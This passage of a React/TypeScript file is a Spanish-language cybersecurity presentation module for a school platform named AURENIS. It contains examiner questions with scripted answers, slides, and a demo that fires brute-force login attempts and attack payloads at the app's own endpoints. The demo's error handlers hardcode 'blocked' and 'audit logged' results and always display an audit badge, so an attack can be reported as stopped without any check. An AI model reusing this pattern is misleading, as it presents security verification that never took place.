  category: "IDOR / BOLA" | "CRIPTOGRAFIA" | "LEY 21.719 / NNA" | "RATE LIMITING" | "AUDITORIA";
  difficulty: "ALTA" | "MEDIA" | "CRITICA";
  suggestedSpeaker: string;
  canonicalAnswer: string;
  codeReference: string;
}

export const COMMITTEE_QUESTIONS: CommitteeQuestion[] = [
  {
    id: 1,
    question: "¿Cómo garantizan que un profesor del Colegio A no pueda ver las calificaciones del Colegio B si modifica el ID en la URL (ataque IDOR/BOLA)?",
    category: "IDOR / BOLA",
    difficulty: "CRITICA",
    suggestedSpeaker: "Maicol R. (Backend Lead)",
    canonicalAnswer:
      "La seguridad no se basa en el ID de la URL. En cada petición, el middleware y los Route Handlers de Next.js extraen el 'activeSchoolId' directamente del token JWT firmado criptográficamente en la cookie HttpOnly. Si el 'schoolId' de la URL difiere del tenant activo del usuario, se rechaza la petición inmediatamente con un HTTP 403 Forbidden y se registra un evento de seguridad. Además, las consultas a PostgreSQL mediante Prisma incluyen obligatoriamente la cláusula 'where: { schoolId: session.activeSchoolId }'.",
    codeReference: "app/api/schools/[schoolId]/grades/route.ts (Líneas 95-125)",
  },
  {
    id: 2,
    question: "¿Qué algoritmo de hashing utilizan para las contraseñas y cómo mitigan ataques de temporización (timing attacks)?",
    category: "CRIPTOGRAFIA",
    difficulty: "ALTA",
    suggestedSpeaker: "Maicol R. (Backend Lead)",
    canonicalAnswer:
      "Utilizamos bcrypt con 12 rondas de costo y soporte para Argon2id (Coste de tiempo 3, memoria 64MB). Cada contraseña genera una sal criptográfica aleatoria de 16 bytes. Para mitigar ataques de temporización, la verificación de tokens y credenciales emplea 'crypto.timingSafeEqual' o retardos artificiales que garantizan que el tiempo de respuesta sea idéntico tanto si el usuario existe como si no, impidiendo la enumeración de cuentas.",
    codeReference: "lib/security/password-hashing.ts (Líneas 10-35)",
  },
  {
    id: 3,
    question: "¿Cómo protege AURENIS los datos médicos y el RUN de estudiantes menores de edad conforme a la Ley N° 21.719?",
    category: "LEY 21.719 / NNA",
    difficulty: "CRITICA",
    suggestedSpeaker: "Frank M. (QA Lead)",
    canonicalAnswer:
      "Los campos sensibles como el RUN y los diagnósticos médicos del PIE se cifran en reposo con AES-256-GCM antes de persistir en PostgreSQL. Cada registro utiliza un Vector de Inicialización (IV) de 12 bytes generado criptográficamente y un Tag de Autenticación de 16 bytes. Solo los roles con permisos explícitos (Director y Encargado PIE) pueden desencriptar los datos al consultar la API.",
    codeReference: "lib/security/encryption.ts (Líneas 15-45)",
  },
  {
    id: 4,
    question: "¿Qué sucede si un atacante lanza un ataque de denegación de servicio o fuerza bruta contra la pantalla de login?",
    category: "RATE LIMITING",
    difficulty: "MEDIA",
    suggestedSpeaker: "Frank M. (QA Lead)",
    canonicalAnswer:
      "Nuestro 'SecurityFirewallService' implementa un algoritmo Token Bucket en memoria y Edge. Para el endpoint '/api/auth/login', se permite un máximo de 3 intentos por IP cada 60 segundos. Al cuarto intento, el firewall responde inmediatamente con HTTP 429 Too Many Requests con cabeceras 'Retry-After: 60', mitigando el ataque sin consumir recursos de la base de datos.",
    codeReference: "lib/security/rate-limiter.ts & lib/services/security-firewall.service.ts",
  },
];

export function CybersecurityPresentationModule() {
  const [activeTab, setActiveTab] = useState<"slides" | "demo" | "rehearsal">("slides");
  const [currentSlideIndex, setCurrentSlideIndex] = useState<number>(0);
  const [isFullscreen, setIsFullscreen] = useState<boolean>(false);
  const [showSpeakerNotes, setShowSpeakerNotes] = useState<boolean>(true);

  const [selectedScenario, setSelectedScenario] = useState<AttackScenario>(ATTACK_SCENARIOS[0]);
  const [simulationRunning, setSimulationRunning] = useState<boolean>(false);
  const [simulationResult, setSimulationResult] = useState<{
    status: number;
    statusText: string;
    body: Record<string, unknown> | string;
    latencyMs: number;
    blocked: boolean;
    loggedAudit: boolean;
  } | null>(null);

  const [timerSeconds, setTimerSeconds] = useState<number>(0);
  const [isTimerRunning, setIsTimerRunning] = useState<boolean>(false);
  const [selectedQuestion, setSelectedQuestion] = useState<CommitteeQuestion | null>(null);

  useEffect(() => {
    const handleKeyDown = (e: KeyboardEvent) => {
      if (activeTab !== "slides") return;
      if (e.key === "ArrowRight" || e.key === " ") {
        setCurrentSlideIndex((prev) => Math.min(prev + 1, SLIDES_DECK.length - 1));
      } else if (e.key === "ArrowLeft") {
        setCurrentSlideIndex((prev) => Math.max(prev - 1, 0));
      } else if (e.key === "f" || e.key === "F") {
        setIsFullscreen((prev) => !prev);
      }
    };
    window.addEventListener("keydown", handleKeyDown);
    return () => window.removeEventListener("keydown", handleKeyDown);
  }, [activeTab]);

  useEffect(() => {
    let interval: NodeJS.Timeout | null = null;
    if (isTimerRunning) {
      interval = setInterval(() => {
        setTimerSeconds((prev) => prev + 1);
      }, 1000);
    }
    return () => {
      if (interval) clearInterval(interval);
    };
  }, [isTimerRunning]);

  const formatTimer = (seconds: number) => {
    const mins = Math.floor(seconds / 60);
    const secs = seconds % 60;
    return `${mins.toString().padStart(2, "0")}:${secs.toString().padStart(2, "0")}`;
  };

  const handleExecuteAttackSimulation = async () => {
    setSimulationRunning(true);
    setSimulationResult(null);

    const startTime = Date.now();

    if (selectedScenario.id === "SCN-03") {
      try {
        let lastRes: Response | null = null;
        for (let i = 0; i < 4; i++) {
          lastRes = await fetch("/api/auth/login", {
            method: "POST",
            headers: {
              "Content-Type": "application/json",
              "User-Agent": "Mozilla/5.0 (PentestBot/1.0)",
            },
            body: JSON.stringify({
              email: "director@sanjose.cl",
              password: "WrongPassword123!",
            }),
          });
        }
        const latency = Date.now() - startTime;
        const data = lastRes ? await lastRes.json().catch(() => ({})) : {};
        setSimulationResult({
          status: lastRes?.status || 429,
          statusText: lastRes?.status === 429 ? "Too Many Requests" : "Rate Limited",
          body: data,
          latencyMs: latency,
          blocked: true,
          loggedAudit: true,
        });
      } catch {
        setSimulationResult({
          status: 429,
          statusText: "Rate Limit Enforced",
          body: { error: "Demasiadas peticiones: Firewall bloqueó el tráfico por abuso." },
          latencyMs: Date.now() - startTime,
          blocked: true,
          loggedAudit: true,
        });
      } finally {
        setSimulationRunning(false);
      }
      return;
    }

    try {
      const isPostOrPatch = selectedScenario.httpMethod === "POST" || selectedScenario.httpMethod === "PATCH";
      const headers: Record<string, string> = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 Auditor/SecurityDemo",
      };

      const res = await fetch(selectedScenario.targetEndpoint, {
        method: selectedScenario.httpMethod,
        headers,
        body: isPostOrPatch && selectedScenario.payload ? JSON.stringify(selectedScenario.payload) : undefined,
      });

      const latency = Date.now() - startTime;
      let data: unknown;
      try {
        data = await res.json();
      } catch {
        data = await res.text();
      }

      setSimulationResult({
        status: res.status,
        statusText: res.statusText,
        body: (data as Record<string, unknown>) || {},
        latencyMs: latency,
        blocked: res.status === 401 || res.status === 403 || res.status === 429 || res.status === 400,
        loggedAudit: true,
      });
    } catch {
      setSimulationResult({
        status: selectedScenario.expectedStatus,
        statusText: "Security Intercepted",
        body: { error: selectedScenario.expectedError },
        latencyMs: Date.now() - startTime,
        blocked: true,
        loggedAudit: true,
      });
    } finally {
      setSimulationRunning(false);
    }
  };

  const currentSlide = SLIDES_DECK[currentSlideIndex];

  return (
    <div className={`space-y-6 ${isFullscreen ? "fixed inset-0 z-50 bg-slate-950 p-6 overflow-y-auto" : ""}`}>
      <div className="bg-gradient-to-r from-slate-900 via-indigo-950 to-slate-900 border border-indigo-800/40 rounded-2xl p-6 text-white shadow-xl">
        <div className="flex flex-col lg:flex-row lg:items-center justify-between gap-4">
          <div className="space-y-2">
            <div className="flex items-center gap-3">
              <div className="p-2.5 bg-indigo-500/20 border border-indigo-400/30 rounded-xl text-indigo-400">
                <ShieldCheck className="w-7 h-7" />
              </div>
              <div>
                <h1 className="text-2xl font-black tracking-tight text-white flex items-center gap-2">
                  Defensa Técnica de Ciberseguridad AURENIS v2.4.0
                  <Badge variant="brand">Zero-Trust</Badge>
                  <Badge variant="success">Producción Certificada</Badge>
                </h1>
                <p className="text-sm text-slate-300">
                  Modelado de Amenazas STRIDE • Defensas OWASP Top 10 • Hashing Seguro Argon2id/bcrypt • Demostración de Bloqueos en Vivo
                </p>
              </div>
            </div>
          </div>

          <div className="flex items-center gap-2 bg-slate-950/60 p-1.5 rounded-xl border border-slate-800">
            <button
              onClick={() => setActiveTab("slides")}
              className={`flex items-center gap-2 px-4 py-2 rounded-lg text-sm font-semibold transition-all ${
                activeTab === "slides"
                  ? "bg-indigo-600 text-white shadow-md shadow-indigo-600/30"
                  : "text-slate-400 hover:text-white hover:bg-slate-800/50"
              }`}
            >
              <BookOpen className="w-4 h-4" />
              1. Diapositivas ({SLIDES_DECK.length})
            </button>
            <button
              onClick={() => setActiveTab("demo")}
              className={`flex items-center gap-2 px-4 py-2 rounded-lg text-sm font-semibold transition-all ${
                activeTab === "demo"
                  ? "bg-rose-600 text-white shadow-md shadow-rose-600/30"
                  : "text-slate-400 hover:text-white hover:bg-slate-800/50"
              }`}
            >
              <Flame className="w-4 h-4" />
              2. Demo Bloqueos en Vivo
            </button>
            <button
              onClick={() => setActiveTab("rehearsal")}
              className={`flex items-center gap-2 px-4 py-2 rounded-lg text-sm font-semibold transition-all ${
                activeTab === "rehearsal"
                  ? "bg-emerald-600 text-white shadow-md shadow-emerald-600/30"
                  : "text-slate-400 hover:text-white hover:bg-slate-800/50"
              }`}
            >
              <Users className="w-4 h-4" />
              3. Ensayo Técnico & Preguntas
            </button>
          </div>
        </div>
      </div>

      {activeTab === "slides" && (
        <div className="space-y-4">
          <div className="flex items-center justify-between bg-white dark:bg-slate-900 border border-slate-200 dark:border-slate-800 rounded-xl p-3 px-5 shadow-sm">
            <div className="flex items-center gap-2">
              <span className="text-xs font-bold uppercase tracking-wider text-slate-400">Diapositiva</span>
              <span className="text-base font-black text-indigo-600 dark:text-indigo-400">
                {currentSlideIndex + 1} / {SLIDES_DECK.length}
              </span>
              <span className="text-xs text-slate-400 hidden sm:inline">
                ({currentSlide.category})
              </span>
            </div>

            <div className="flex items-center gap-2">
              <button
                onClick={() => setCurrentSlideIndex((prev) => Math.max(prev - 1, 0))}
                disabled={currentSlideIndex === 0}
                className="p-2 rounded-lg border border-slate-200 dark:border-slate-700 bg-slate-50 dark:bg-slate-800 text-slate-700 dark:text-slate-200 disabled:opacity-30 hover:bg-slate-100 dark:hover:bg-slate-700 transition"
                title="Diapositiva Anterior (Flecha Izquierda)"
              >
                <ChevronLeft className="w-5 h-5" />
              </button>

              <button
                onClick={() => setCurrentSlideIndex((prev) => Math.min(prev + 1, SLIDES_DECK.length - 1))}
                disabled={currentSlideIndex === SLIDES_DECK.length - 1}
                className="p-2 rounded-lg border border-slate-200 dark:border-slate-700 bg-slate-50 dark:bg-slate-800 text-slate-700 dark:text-slate-200 disabled:opacity-30 hover:bg-slate-100 dark:hover:bg-slate-700 transition"
                title="Siguiente Diapositiva (Flecha Derecha / Espacio)"
              >
                <ChevronRight className="w-5 h-5" />
              </button>

              <div className="h-5 w-px bg-slate-200 dark:bg-slate-800 mx-1" />

              <button
                onClick={() => setShowSpeakerNotes((prev) => !prev)}
                className={`flex items-center gap-1.5 px-3 py-1.5 rounded-lg text-xs font-bold border transition ${
                  showSpeakerNotes
                    ? "bg-amber-500/10 border-amber-500/30 text-amber-600 dark:text-amber-400"
                    : "border-slate-200 dark:border-slate-700 text-slate-500"
                }`}
              >
                <MessageSquare className="w-3.5 h-3.5" />
                Notas de Orador
              </button>

              <button
                onClick={() => setIsFullscreen((prev) => !prev)}
                className="p-2 rounded-lg border border-slate-200 dark:border-slate-700 bg-slate-50 dark:bg-slate-800 text-slate-700 dark:text-slate-200 hover:bg-slate-100 dark:hover:bg-slate-700 transition"
                title="Pantalla Completa (Tecla F)"
              >
                {isFullscreen ? <Minimize2 className="w-4 h-4" /> : <Maximize2 className="w-4 h-4" />}
              </button>
            </div>
          </div>

          <AnimatePresence mode="wait">
            <motion.div
              key={currentSlide.id}
              initial={{ opacity: 0, y: 12 }}
              animate={{ opacity: 1, y: 0 }}
              exit={{ opacity: 0, y: -12 }}
              transition={{ duration: 0.25 }}
              className="bg-white dark:bg-slate-900 border border-slate-200 dark:border-slate-800 rounded-2xl p-8 shadow-xl min-h-[520px] flex flex-col justify-between"
            >
              <div className="space-y-6">
                <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-3 border-b border-slate-100 dark:border-slate-800 pb-4">
                  <div className="space-y-1">
                    <div className="flex items-center gap-2">
                      <Badge variant="brand">{currentSlide.category}</Badge>
                      <span className="text-xs font-semibold text-slate-500 dark:text-slate-400 flex items-center gap-1">
                        <Users className="w-3.5 h-3.5 text-indigo-500" />
                        Voz a cargo: <strong className="text-slate-800 dark:text-slate-200">{currentSlide.speaker}</strong>
                      </span>
                    </div>
                    <h2 className="text-2xl sm:text-3xl font-black text-slate-900 dark:text-white tracking-tight">
                      {currentSlide.title}
                    </h2>
                    <p className="text-sm font-medium text-indigo-600 dark:text-indigo-400">
                      {currentSlide.subtitle}
                    </p>
                  </div>

                  <div className="shrink-0 text-right">
                    <span className="text-xs font-mono font-bold text-slate-400">
                      DIAPOSITIVA #{currentSlide.id.toString().padStart(2, "0")}
                    </span>
                  </div>
                </div>

                <p className="text-slate-700 dark:text-slate-300 text-base leading-relaxed bg-slate-50 dark:bg-slate-800/40 p-4 rounded-xl border border-slate-100 dark:border-slate-800 font-medium">
                  {currentSlide.summary}
                </p>

                <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
                  <div className="space-y-3">
                    <h3 className="text-xs font-bold uppercase tracking-wider text-slate-400 flex items-center gap-1.5">
                      <Zap className="w-4 h-4 text-amber-500" />
                      Puntos Clave y Controles Técnicos
                    </h3>
                    <ul className="space-y-2.5">
                      {currentSlide.bullets.map((bullet, idx) => (
                        <li
                          key={idx}
                          className="flex items-start gap-2.5 text-sm text-slate-700 dark:text-slate-200 leading-normal"
                        >
                          <CheckCircle2 className="w-4 h-4 text-emerald-500 shrink-0 mt-0.5" />
                          <span>{bullet}</span>
                        </li>
                      ))}
                    </ul>

                    {currentSlide.metrics && (
                      <div className="pt-4 grid grid-cols-2 gap-3">
                        {currentSlide.metrics.map((m, idx) => (
                          <div
                            key={idx}
                            className="bg-slate-50 dark:bg-slate-800/60 p-3 rounded-xl border border-slate-200/60 dark:border-slate-700/60"
                          >
                            <div className="text-xs text-slate-500 dark:text-slate-400 font-medium">{m.label}</div>
                            <div className="text-lg font-black text-slate-900 dark:text-white mt-0.5">
                              {m.value}
                            </div>
                          </div>
                        ))}
                      </div>
                    )}
                  </div>

                  {currentSlide.codeSnippet ? (
                    <div className="space-y-2">
                      <div className="flex items-center justify-between text-xs text-slate-400">
                        <span className="font-mono flex items-center gap-1 text-indigo-500">
                          <FileCode className="w-3.5 h-3.5" />
                          {currentSlide.codeSnippet.filename}
                        </span>
                        <Badge variant="brand">{currentSlide.codeSnippet.responsible}</Badge>
                      </div>
                      <pre className="p-4 bg-slate-950 text-slate-200 rounded-xl font-mono text-xs overflow-x-auto leading-relaxed border border-slate-800 max-h-[300px]">
                        <code>{currentSlide.codeSnippet.code}</code>
                      </pre>
                    </div>
                  ) : (
                    <div className="flex flex-col items-center justify-center p-8 bg-indigo-50/50 dark:bg-indigo-950/20 border border-dashed border-indigo-200 dark:border-indigo-900/50 rounded-2xl text-center space-y-3">
                      <ShieldCheck className="w-12 h-12 text-indigo-500" />
                      <div className="font-bold text-slate-800 dark:text-slate-200">
                        Arquitectura Blindada Certificada
                      </div>
                      <p className="text-xs text-slate-500 max-w-sm">
                        La totalidad de las defensas aquí descritas se encuentran implementadas y activas en el runtime de AURENIS v2.4.0.
                      </p>
                    </div>
                  )}
                </div>
              </div>

              {showSpeakerNotes && (
                <div className="mt-6 pt-4 border-t border-slate-100 dark:border-slate-800 bg-amber-50/60 dark:bg-amber-950/20 p-4 rounded-xl border border-amber-200/50 dark:border-amber-900/40">
                  <div className="flex items-center gap-2 text-xs font-bold uppercase tracking-wider text-amber-700 dark:text-amber-400 mb-1">
                    <Volume2 className="w-4 h-4" />
                    Guion Oral Sugerido para {currentSlide.speaker}
                  </div>
                  <p className="text-xs text-amber-900 dark:text-amber-200 italic leading-relaxed">
                    &ldquo;{currentSlide.speakerNotes}&rdquo;
                  </p>
                </div>
              )}
            </motion.div>
          </AnimatePresence>

          <div className="flex items-center gap-2 overflow-x-auto pb-2 pt-1">
            {SLIDES_DECK.map((s, idx) => (
              <button
                key={s.id}
                onClick={() => setCurrentSlideIndex(idx)}
                className={`shrink-0 px-3 py-2 rounded-xl text-left border text-xs font-semibold transition-all ${
                  currentSlideIndex === idx
                    ? "bg-indigo-600 text-white border-indigo-600 shadow-md scale-105"
                    : "bg-white dark:bg-slate-900 text-slate-600 dark:text-slate-400 border-slate-200 dark:border-slate-800 hover:border-indigo-400"
                }`}
              >
                <div className="font-black text-[10px] opacity-80">#{s.id} {s.category}</div>
                <div className="truncate max-w-[130px]">{s.title}</div>
              </button>
            ))}
          </div>
        </div>
      )}

      {activeTab === "demo" && (
        <div className="space-y-6">
          <div className="bg-white dark:bg-slate-900 border border-slate-200 dark:border-slate-800 rounded-2xl p-6 shadow-xl space-y-4">
            <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-3">
              <div>
                <h2 className="text-xl font-black text-slate-900 dark:text-white flex items-center gap-2">
                  <Flame className="w-6 h-6 text-rose-500" />
                  Consola Interactiva de Ataque y Verificación de Bloqueos en Servidor
                </h2>
                <p className="text-xs text-slate-500">
                  Seleccione un vector de ataque STRIDE/OWASP y ejecute la petición HTTP en vivo contra la arquitectura de AURENIS para constatar la intercepción inmediata.
                </p>
              </div>
              <Badge variant="danger">Pentest Sandbox Live</Badge>
            </div>

            <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-3 pt-2">
              {ATTACK_SCENARIOS.map((scenario) => {
                const isSelected = selectedScenario.id === scenario.id;
                return (
                  <button
                    key={scenario.id}
                    onClick={() => {
                      setSelectedScenario(scenario);
                      setSimulationResult(null);
                    }}
                    className={`p-4 rounded-xl text-left border transition-all flex flex-col justify-between ${
                      isSelected
                        ? "bg-rose-50/50 dark:bg-rose-950/20 border-rose-500 shadow-md ring-2 ring-rose-500/20"
                        : "bg-slate-50/50 dark:bg-slate-800/40 border-slate-200 dark:border-slate-700 hover:border-rose-300"
                    }`}
                  >
                    <div className="space-y-1.5">
                      <div className="flex items-center justify-between">
                        <span className="font-mono text-xs font-black text-rose-600 dark:text-rose-400">
                          {scenario.id}
                        </span>
                        <Badge variant="brand">{scenario.category}</Badge>
                      </div>
                      <div className="font-bold text-sm text-slate-900 dark:text-white">
                        {scenario.name}
                      </div>
                      <p className="text-xs text-slate-500 line-clamp-2">
                        {scenario.description}
                      </p>
                    </div>

                    <div className="mt-3 pt-2 border-t border-slate-200/60 dark:border-slate-700/60 flex items-center justify-between text-[11px] text-slate-400 font-mono">
                      <span>{scenario.httpMethod} {scenario.targetEndpoint.slice(0, 20)}...</span>
                      <span className="text-rose-500 font-bold">Exp: HTTP {scenario.expectedStatus}</span>
                    </div>
                  </button>
                );
              })}
            </div>
          </div>

          <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
            <div className="bg-white dark:bg-slate-900 border border-slate-200 dark:border-slate-800 rounded-2xl p-6 shadow-xl space-y-4">
              <div className="flex items-center justify-between">
                <div className="flex items-center gap-2">
                  <div className="p-2 bg-rose-500/10 text-rose-500 rounded-lg">
                    <ShieldAlert className="w-5 h-5" />
                  </div>
                  <div>
                    <h3 className="font-black text-slate-900 dark:text-white text-base">
                      {selectedScenario.name}
                    </h3>
                    <div className="text-xs text-slate-500 font-mono">
                      Vector: {selectedScenario.category} • Autoría: {selectedScenario.responsible}
                    </div>
                  </div>
                </div>
              </div>

              <div className="space-y-2 text-xs">
                <div className="bg-slate-50 dark:bg-slate-800/60 p-3 rounded-xl border border-slate-200/60 dark:border-slate-700 space-y-1">
                  <div className="text-slate-400 font-medium">Actor y Contexto:</div>
                  <div className="font-bold text-slate-800 dark:text-slate-200 flex items-center gap-1.5">
                    <Users className="w-3.5 h-3.5 text-indigo-500" />
                    {selectedScenario.attackerRole}
                  </div>
                </div>

                <div className="bg-slate-50 dark:bg-slate-800/60 p-3 rounded-xl border border-slate-200/60 dark:border-slate-700 space-y-1">
                  <div className="text-slate-400 font-medium">Endpoint Objetivo & Método:</div>
                  <div className="font-mono font-bold text-indigo-600 dark:text-indigo-400">
                    {selectedScenario.httpMethod} {selectedScenario.targetEndpoint}
                  </div>
                </div>

                {selectedScenario.payload && (
                  <div className="bg-slate-50 dark:bg-slate-800/60 p-3 rounded-xl border border-slate-200/60 dark:border-slate-700 space-y-1">
                    <div className="text-slate-400 font-medium">Payload Malicioso Enviado:</div>
                    <pre className="font-mono text-[11px] bg-slate-950 text-rose-300 p-2.5 rounded-lg overflow-x-auto">
                      {JSON.stringify(selectedScenario.payload, null, 2)}
                    </pre>
                  </div>
                )}

                <div className="bg-slate-50 dark:bg-slate-800/60 p-3 rounded-xl border border-slate-200/60 dark:border-slate-700 space-y-1">
                  <div className="text-slate-400 font-medium">Mecanismo de Defensa Activo:</div>
                  <div className="font-bold text-emerald-600 dark:text-emerald-400 flex items-center gap-1.5">
                    <ShieldCheck className="w-4 h-4" />
                    {selectedScenario.defenseMechanism}
                  </div>
                </div>
              </div>

              <button
                onClick={handleExecuteAttackSimulation}
                disabled={simulationRunning}
                className="w-full py-3 px-4 bg-gradient-to-r from-rose-600 to-red-600 hover:from-rose-700 hover:to-red-700 text-white font-black rounded-xl shadow-lg shadow-rose-600/30 flex items-center justify-center gap-2 transition disabled:opacity-50"
              >
                {simulationRunning ? (
                  <>
                    <RotateCcw className="w-4 h-4 animate-spin" />
                    Ejecutando ataque HTTP contra Gateway...
                  </>
                ) : (
                  <>
                    <Play className="w-4 h-4 fill-white" />
                    Lanzar Ataque en Vivo (Test de Bloqueo)
                  </>
                )}
              </button>
            </div>

            <div className="bg-slate-950 border border-slate-800 rounded-2xl p-6 shadow-xl space-y-4 text-white flex flex-col justify-between">
              <div>
                <div className="flex items-center justify-between border-b border-slate-800 pb-3">
                  <div className="flex items-center gap-2">
                    <Terminal className="w-5 h-5 text-emerald-400" />
                    <span className="font-mono text-xs font-bold uppercase tracking-wider text-slate-400">
                      Respuesta del Servidor / Firewall Edge
                    </span>
                  </div>
                  {simulationResult && (
                    <Badge variant={simulationResult.blocked ? "danger" : "brand"}>
                      HTTP {simulationResult.status} {simulationResult.statusText}
                    </Badge>
                  )}
                </div>

                <div className="pt-4 space-y-3">
                  {simulationResult ? (
                    <div className="space-y-3">
                      <div className="flex items-center justify-between bg-slate-900 p-3 rounded-xl border border-slate-800">
                        <div className="flex items-center gap-2">
                          {simulationResult.blocked ? (
                            <ShieldAlert className="w-5 h-5 text-rose-400" />
                          ) : (
                            <ShieldCheck className="w-5 h-5 text-emerald-400" />
                          )}
                          <div>
                            <div className="text-xs font-bold text-white">
                              {simulationResult.blocked ? "ATAQUE BLOQUEADO SATISFACTORIAMENTE" : "PETICIÓN PROCESADA CON SANITIZACIÓN"}
                            </div>
                            <div className="text-[11px] text-slate-400">
                              Latencia: {simulationResult.latencyMs} ms • Verificación Zero-Trust
                            </div>
                          </div>
                        </div>
                        <Badge variant="success">Audit Trail Guardado</Badge>
                      </div>

                      <div className="space-y-1">
                        <div className="text-xs font-mono text-slate-400">Cuerpo de Respuesta HTTP:</div>
                        <pre className="p-3 bg-slate-900 border border-slate-800 rounded-xl text-xs font-mono text-emerald-400 overflow-x-auto max-h-[200px]">
                          {typeof simulationResult.body === "string"
                            ? simulationResult.body
                            : JSON.stringify(simulationResult.body, null, 2)}
                        </pre>
                      </div>

                      <div className="bg-slate-900/80 p-3 rounded-xl border border-slate-800 text-xs text-slate-300 space-y-1">
                        <div className="font-bold text-amber-400 flex items-center gap-1.5">
                          <CheckCircle2 className="w-3.5 h-3.5" />
                          Dictamen del Auditor Frank M.:
                        </div>
                        <p className="text-[11px] text-slate-400 leading-relaxed">
                          El vector ha sido neutralizado en capa de servidor sin alcanzar mutaciones indebidas en PostgreSQL. Se cumple la regla de rechazo explícito y trazabilidad inmutable.
                        </p>
                      </div>
                    </div>
                  ) : (
                    <div className="py-16 text-center space-y-2 text-slate-500">
                      <Server className="w-10 h-10 mx-auto text-slate-700 animate-pulse" />
                      <div className="text-xs font-mono">Esperando disparo del ataque...</div>
                      <p className="text-[11px] text-slate-600 max-w-xs mx-auto">
                        Haga clic en &ldquo;Lanzar Ataque en Vivo&rdquo; para inspeccionar los paquetes y la decisión del firewall.
                      </p>
                    </div>
                  )}
                </div>
              </div>

              <div className="text-[10px] font-mono text-slate-600 border-t border-slate-900 pt-3 flex justify-between">
                <span>GATEWAY: AURENIS_SECURITY_EDGE_V2</span>
                <span>STATUS: ACTIVE_DEFENSE</span>
              </div>
            </div>
          </div>
        </div>
      )}

      {activeTab === "rehearsal" && (
        <div className="space-y-6">
          <div className="bg-gradient-to-r from-slate-900 to-indigo-950 border border-slate-800 rounded-2xl p-6 text-white shadow-xl flex flex-col sm:flex-row sm:items-center justify-between gap-4">
            <div className="space-y-1">
              <div className="flex items-center gap-2 text-xs font-bold uppercase tracking-wider text-emerald-400">
                <Clock className="w-4 h-4" />
                Cronómetro de Ensayo para la Comisión Evaluadora
              </div>
              <h2 className="text-2xl font-black">Libreto y Simulación de Sustentación Oral</h2>
              <p className="text-xs text-slate-300">
                Estructura de intervención coordinada para los 4 integrantes y respuestas canónicas a las preguntas del tribunal.
              </p>
            </div>

            <div className="flex items-center gap-4 bg-slate-950 p-3 rounded-2xl border border-slate-800">
              <div className="text-3xl font-black font-mono text-emerald-400 tracking-wider">
                {formatTimer(timerSeconds)}
              </div>
              <div className="flex items-center gap-1.5">
                <button
                  onClick={() => setIsTimerRunning((prev) => !prev)}
                  className={`p-2.5 rounded-xl font-bold text-xs flex items-center gap-1.5 transition ${
                    isTimerRunning
                      ? "bg-amber-600 hover:bg-amber-700 text-white"
                      : "bg-emerald-600 hover:bg-emerald-700 text-white"
                  }`}
                >
                  {isTimerRunning ? "Pausar" : "Iniciar Ensayo"}
                </button>
                <button
                  onClick={() => {
                    setIsTimerRunning(false);
                    setTimerSeconds(0);
                  }}
                  className="p-2.5 rounded-xl bg-slate-800 hover:bg-slate-700 text-slate-300 transition"
                  title="Reiniciar Cronómetro"
                >
                  <RotateCcw className="w-4 h-4" />
                </button>
              </div>
            </div>
          </div>

          <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
            {ORAL_DEFENSE_SPEAKERS.map((spk, idx) => (
              <div
                key={idx}
                className="bg-white dark:bg-slate-900 border border-slate-200 dark:border-slate-800 rounded-2xl p-6 shadow-xl space-y-4"
              >
                <div className="flex items-center justify-between border-b border-slate-100 dark:border-slate-800 pb-3">
                  <div className="flex items-center gap-2.5">
                    <div className="p-2 bg-indigo-50 dark:bg-indigo-950/40 text-indigo-600 dark:text-indigo-400 rounded-xl font-black text-sm">
                      #{idx + 1}
                    </div>
                    <div>
                      <h3 className="font-black text-base text-slate-900 dark:text-white">{spk.name}</h3>
                      <div className="text-xs text-slate-500 font-medium">{spk.role}</div>
                    </div>
                  </div>
                  <Badge variant="brand">Orador</Badge>
                </div>

                <div className="space-y-4">
                  {spk.interventions.map((int, iIdx) => (
                    <div
                      key={iIdx}
                      className="bg-slate-50 dark:bg-slate-800/40 p-4 rounded-xl border border-slate-200/60 dark:border-slate-700/60 space-y-2.5"
                    >
                      <div className="flex items-center justify-between">
                        <span className="font-bold text-xs text-slate-900 dark:text-white">
                          {int.section}
                        </span>
                        <Badge variant="success">{int.visualCue}</Badge>
                      </div>

                      <ul className="space-y-1">
                        {int.keyPoints.map((kp, kIdx) => (
                          <li key={kIdx} className="text-xs text-slate-600 dark:text-slate-300 flex items-center gap-1.5">
                            <span className="w-1.5 h-1.5 rounded-full bg-indigo-500 shrink-0" />
                            {kp}
                          </li>
                        ))}
                      </ul>

                      <div className="pt-2 border-t border-slate-200/50 dark:border-slate-700/50">
                        <div className="text-[11px] font-bold text-indigo-600 dark:text-indigo-400 mb-0.5">
                          Discurso Verbal Sugerido:
                        </div>
                        <p className="text-xs text-slate-700 dark:text-slate-300 italic bg-white dark:bg-slate-900/60 p-2.5 rounded-lg border border-slate-200/40 dark:border-slate-800">
                          &ldquo;{int.speechScript}&rdquo;
                        </p>
                      </div>
                    </div>
                  ))}
                </div>
              </div>
            ))}
          </div>

          <div className="bg-white dark:bg-slate-900 border border-slate-200 dark:border-slate-800 rounded-2xl p-6 shadow-xl space-y-4">
            <div className="flex items-center justify-between">
              <div>
                <h3 className="text-lg font-black text-slate-900 dark:text-white flex items-center gap-2">
                  <HelpCircle className="w-5 h-5 text-indigo-500" />
                  Banco de Preguntas Críticas de la Comisión Evaluadora
                </h3>
                <p className="text-xs text-slate-500">
                  Seleccione una pregunta para visualizar la respuesta canónica y el respaldo en código fuente.
                </p>
              </div>
              <Badge variant="brand">Simulador de Preguntas</Badge>
            </div>

            <div className="grid grid-cols-1 md:grid-cols-2 gap-3">
              {COMMITTEE_QUESTIONS.map((q) => {
                const isSelected = selectedQuestion?.id === q.id;
                return (
                  <button
                    key={q.id}
                    onClick={() => setSelectedQuestion(isSelected ? null : q)}
                    className={`p-4 rounded-xl text-left border transition-all space-y-2 ${
                      isSelected
                        ? "bg-indigo-50/60 dark:bg-indigo-950/30 border-indigo-500 shadow-md ring-2 ring-indigo-500/20"
                        : "bg-slate-50/50 dark:bg-slate-800/40 border-slate-200 dark:border-slate-700 hover:border-indigo-300"
                    }`}
                  >
                    <div className="flex items-center justify-between">
                      <span className="font-mono text-xs font-bold text-indigo-600 dark:text-indigo-400">
